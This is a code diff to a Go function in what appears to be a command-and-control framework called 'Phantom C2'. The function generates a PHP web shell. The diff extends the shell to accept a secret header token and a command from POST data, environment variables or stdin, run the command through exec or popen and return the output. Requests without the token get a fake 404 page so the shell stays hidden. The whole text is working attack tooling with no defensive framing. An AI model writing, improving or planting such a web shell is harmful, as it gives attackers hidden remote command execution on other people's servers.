@@ -125,12 +125,30 @@ if (Request.Headers["X-Debug-Token"] == "{{.Token}}") {
 func generatePHP(cfg PayloadConfig) (string, error) {
 	tmpl := `<?php
 // Phantom C2 — PHP Web Shell
-// Disguised as configuration file
+// Works on Apache/Nginx (mod_php/CGI) and php-cli (Flask/custom handlers)
 error_reporting(0);
-if (isset($_SERVER['HTTP_X_DEBUG_TOKEN']) && $_SERVER['HTTP_X_DEBUG_TOKEN'] === '{{.Token}}') {
-    if (isset($_POST['data'])) {
+
+// Get auth token — check $_SERVER first (web server), then env (CLI)
+$token = '';
+if (isset($_SERVER['HTTP_X_DEBUG_TOKEN'])) {
+    $token = $_SERVER['HTTP_X_DEBUG_TOKEN'];
+} elseif (getenv('HTTP_X_DEBUG_TOKEN')) {
+    $token = getenv('HTTP_X_DEBUG_TOKEN');
+}
+
+// Get command — check $_POST first (web server), then parse stdin (CLI)
+$cmd = '';
+if (isset($_POST['data'])) {
+    $cmd = $_POST['data'];
+} elseif (getenv('CONTENT_LENGTH') && getenv('CONTENT_LENGTH') > 0) {
+    $input = file_get_contents('php://stdin');
+    parse_str($input, $params);
+    if (isset($params['data'])) $cmd = $params['data'];
+}
+
+if ($token === '{{.Token}}') {
+    if ($cmd !== '') {
         $output = '';
-        $cmd = $_POST['data'];
         if (function_exists('exec')) {
             exec($cmd . ' 2>&1', $out);
             $output = implode("\n", $out);
@@ -150,9 +168,11 @@ if (isset($_SERVER['HTTP_X_DEBUG_TOKEN']) && $_SERVER['HTTP_X_DEBUG_TOKEN'] === 
             pclose($handle);
         }
         echo $output;
+    } else {
+        echo "ready";
     }
 } else {
-    http_response_code(404);
+    if (php_sapi_name() !== 'cli') http_response_code(404);
     echo '<html><head><title>404</title></head><body><h1>Not Found</h1></body></html>';
 }
 ?>`
